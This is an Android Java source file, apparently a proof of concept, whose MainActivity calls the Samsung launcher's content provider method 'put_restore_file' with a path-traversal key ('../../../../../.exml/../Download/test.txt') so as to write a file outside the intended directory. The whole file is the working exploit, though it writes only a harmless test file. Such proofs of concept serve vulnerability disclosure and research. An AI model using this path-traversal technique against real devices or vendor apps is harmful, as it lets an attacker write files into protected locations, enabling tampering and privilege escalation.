package poc.app;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Bundle bundle = new Bundle();
        bundle.putByteArray("../../../../../.exml/../Download/test.txt", "test".getBytes());
        getContentResolver().call("com.sec.android.app.launcher.settings", "put_restore_file", "", bundle);
    }
}